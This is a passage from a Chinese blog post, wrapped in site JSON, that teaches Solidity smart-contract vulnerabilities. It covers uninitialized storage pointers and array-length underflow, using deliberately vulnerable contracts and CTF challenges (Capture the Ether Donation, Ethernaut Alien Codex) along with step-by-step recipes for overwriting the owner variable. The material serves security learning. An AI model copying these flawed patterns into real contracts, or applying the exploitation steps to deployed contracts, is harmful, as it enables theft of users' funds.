变量，这个变量会指向其他变量的区域，从而更改其他变量的值。</p>\n<p>在solidity智能合约语言中，有storage和memory两种存储方式。storage变量是指永远存储在区块链中的变量；memory变量的存储是临时的，这些变量在外部调用结束后会被移除。但是solidity目前对复杂的数据类型，比如array(数组)和struct(结构体)，在函数中作为局部变量时，会默认存储在storaeg中。solidity对于变量存储，都是按照状态在合约中的先后顺序进行依次存储的</p>\n<p>例：</p>\n<p>结构体</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.4</span><span class=\"token number\">.24</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">cover</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token operator\">=</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> user<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token operator\">=></span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span>balanceof<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">regeist</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> youraddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        Name name<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        name<span class=\"token punctuation\">.</span>user<span class=\"token operator\">=</span>youraddress<span class=\"token punctuation\">;</span>\n        name<span class=\"token punctuation\">.</span>balanceof<span class=\"token punctuation\">[</span>youraddress<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getbalance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tar<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        Name name<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> name<span class=\"token punctuation\">.</span>balanceof<span class=\"token punctuation\">[</span>tar<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在进行注册并存款时，由于该storage变量未初始化，所以可能会覆盖其他变量，owner将会被覆盖为youraddress</p>\n<p>比如合约部署后，owner为合约部署者，但是在用户拿着自己的地址进行注册时，owner就变成了user</p>\n<p>部署后</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281249483.png\"></p>\n<p>regeist后</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281249747.png\"></p>\n<p>可见owner被覆盖</p>\n<p>这个例子的修复方案是使用 mapping 进行结构体的初始化，并使用 storage 进行拷贝：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.4</span><span class=\"token number\">.24</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">cover</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token operator\">=</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> user<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token operator\">=></span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span>balanceof<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token operator\">=></span>Name<span class=\"token punctuation\">)</span>wallet<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">regeist</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> id<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> youraddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        Name <span class=\"token keyword\">storage</span> wallets<span class=\"token operator\">=</span>wallet<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        wallets<span class=\"token punctuation\">.</span>user<span class=\"token operator\">=</span>youraddress<span class=\"token punctuation\">;</span>\n        wallets<span class=\"token punctuation\">.</span>balanceof<span class=\"token punctuation\">[</span>youraddress<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getbalance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> id<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> tar<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        Name <span class=\"token keyword\">storage</span> wallets<span class=\"token operator\">=</span>wallet<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> wallets<span class=\"token punctuation\">.</span>balanceof<span class=\"token punctuation\">[</span>tar<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281249739.png\"></p>\n<p>部署合约后owner不会改变</p>\n<p>数组</p>\n<p>代码来源于ctf wiki</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.24</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">example2</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> b<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _a<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        a <span class=\"token operator\">=</span> _a<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> tmp<span class=\"token punctuation\">;</span>\n        tmp<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>_value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        b <span class=\"token operator\">=</span> tmp<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281249503.png\"></p>\n<p>部署合约后设置a为100，在用任意数字调用attack，在看a，可以发现a变成了101</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281250614.png\"></p>\n<p>可见初始化时uint[] tmp导致数组长度变成了a的值，在进行push后，将temp赋值给b，此时覆盖了a为b的长度即100+1&#x3D;101</p>\n<p>例题：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.21</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">DonationChallenge</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Donation</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> timestamp<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> etherAmount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    Donation<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> donations<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">DonationChallenge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">isComplete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">donate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> etherAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// amount is in ether, but msg.value is in wei</span>\n        <span class=\"token builtin\">uint256</span> scale <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">18</span> <span class=\"token operator\">*</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> etherAmount <span class=\"token operator\">/</span> scale<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        Donation donation<span class=\"token punctuation\">;</span>\n        donation<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">=</span> now<span class=\"token punctuation\">;</span>\n        donation<span class=\"token punctuation\">.</span>etherAmount <span class=\"token operator\">=</span> etherAmount<span class=\"token punctuation\">;</span>\n\n        donations<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>donation<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析：执行donate时Donation初始化并传入对应参数，没有强调memory，所以占用storage，实际修改值为slot0以及slot1，所以将etherAmount为int(address(player),16)即可修改owner为player。</p>\n<p>capture the ether——Donation</p>\n<p><a href=\"https://capturetheether.com/challenges/math/donation/\">https://capturetheether.com/challenges/math/donation/</a></p>\n<h1 id=\"7-数组长度溢处\"><a href=\"#7-数组长度溢处\" class=\"headerlink\" title=\"7.数组长度溢处\"></a>7.数组长度溢处</h1><p>原理：数组最大的长度为<code>2^256</code>，如果不做保护，数组长度下溢，通过扩大数组到整个 <code>2^256</code> 的存储区域. 然后用户就可以更改所有合约的storage了</p>\n<p>例：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'../helpers/Ownable-05.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">AlienCodex</span> <span class=\"token keyword\">is</span> Ownable <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> contact<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> codex<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">contacted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>contact<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  \n  <span class=\"token keyword\">function</span> <span class=\"token function\">make_contact</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    contact <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">record</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _content<span class=\"token punctuation\">)</span> contacted <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n  \tcodex<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>_content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">retract</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> contacted <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    codex<span class=\"token punctuation\">.</span>length<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">revise</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> _content<span class=\"token punctuation\">)</span> contacted <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    codex<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _content<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析：数组长度可以通过retract函数下溢处达到<code>2^256</code>，此时codex.length为2**256-1，map[x]的存储地址为keccak256(slot(codex)),此处slot(map)为1，map[x]存储地址为keccak256(slot(codex))+x,所以构造x为 2^256-keccak256(1)，payload为任意地址即可覆盖Ownable-05.sol中的owner变量（owner和contact都存储在slot0）</p>\n<p>相应例题：</p>\n<p>Ethernaut——Alien Codex </p>\n<p><a href=\"https://ethernaut.openzeppelin.com/level/0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272\">https://ethernaut.openzeppelin.com/level/0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272</a></p>\n","text":"1.关于转账的漏洞在solidity中有三种转账方式，分别是call，transfer和send，后两者相对安全，但也分别对应着漏洞。 call转账漏洞——重入例子： pragma solidity ^0.6.0; import '@openzeppelin/contracts/...","link":"","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[],"tags":[{"name":"区块链","slug":"区块链","count":18,"path":"api/tags/区块链.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#1-%E5%85%B3%E4%BA%8E%E8%BD%AC%E8%B4%A6%E7%9A%84%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">1.关于转账的漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#call%E8%BD%AC%E8%B4%A6%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E9%87%8D%E5%85%A5\"><span class=\"toc-text\">call转账漏洞——重入</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#transfer%E8%BD%AC%E8%B4%A6%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">transfer转账漏洞——拒绝服务</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">2.整数溢出漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">溢出漏洞</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#3-%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">3.随机数漏洞</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#4-%E7%9F%AD%E5%9C%B0%E5%9D%80%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">4.短地址漏洞</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#5-call%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">5.call调用漏洞</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#6-%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8C%96%E7%9A%84%E5%AD%98%E5%82%A8%E6%8C%87%E9%92%88\"><span class=\"toc-text\">6.未初始化的存储指针</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#7-%E6%95%B0%E7%BB%84%E9%95%BF%E5%BA%A6%E6%BA%A2%E5%A4%84\"><span class=\"toc-text\">7.数组长度溢处</span></a></li></ol>","author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Learn of Defi","uid":"ffdc2c15bd4d362ddf4d91f867ac761d","slug":"Learn-the-mooc-of-Dawn-song","date":"2022-08-01T11:05:08.276Z","updated":"2022-12-16T07:20:26.323Z","comments":true,"path":"api/articles/Learn-the-mooc-of-Dawn-song.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/1440x810_cmsv2_1c0d4f64-90a4-5519-9625-6efd709351f7-6451006.jpg","text":"1.Defi WHAT？金融基础设施作为建立在公共智能合约平台上的开放、无需许可且高度可互操作的协议栈 WHY？Defi ‘s advantage: 开源系统；建立在无需许可的区块链 任何人都可以在不经过第三方允许的情况下使用&#x2F;互操作或在上面构建 用户无需提供真实身份 ...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"区块链 ctf","slug":"区块链-ctf","count":11,"path":"api/tags/区块链-ctf.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"VNCTF2022 open tournament-> Blockchain-VNloan","uid":"f5b9fca07821fa4050ef59953395a72d","slug":"VNCTF2022 Blockchain-VNloan","date":"2022-08-01T10:45:15.790Z","updated":"2022-12-16T07:22:56.523Z","comments":true,"path":"api/articles/VNCTF2022 Blockchain-VNloan.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221216152229811.png","text":"0x00 背景基于 Uniswap V3 的 DeFi 流动性协议Visor Finance遭受黑客攻击，黑客利用重入漏洞耗尽了880万枚VISR代币，当时，VISR的交易价格约为0.93美元，总损失约为820万美元。 因为call调用产生的漏洞还是比较多的，比如重入漏洞，atn...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[],"tags":[{"name":"区块链 ctf","slug":"区块链-ctf","count":11,"path":"api/tags/区块链-ctf.json"}],"author":{"name":"bcYng","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/296321666270692_.pic.jpg","link":"/","description":"A rookie focused on blockchain security","socials":{"github":"https://github.com/bcYng-w","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}